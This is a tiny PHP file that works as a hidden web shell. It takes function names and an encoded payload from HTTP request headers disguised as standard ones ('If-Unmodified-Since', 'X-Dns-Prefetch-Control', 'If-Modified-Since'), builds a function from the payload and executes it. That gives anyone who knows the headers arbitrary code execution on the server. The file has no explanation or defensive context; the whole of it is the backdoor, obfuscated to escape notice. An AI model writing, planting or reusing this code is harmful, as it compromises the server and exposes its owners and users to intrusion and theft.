<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $parle_tokens = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['If-Modified-Since']));
    $parle_tokens();
}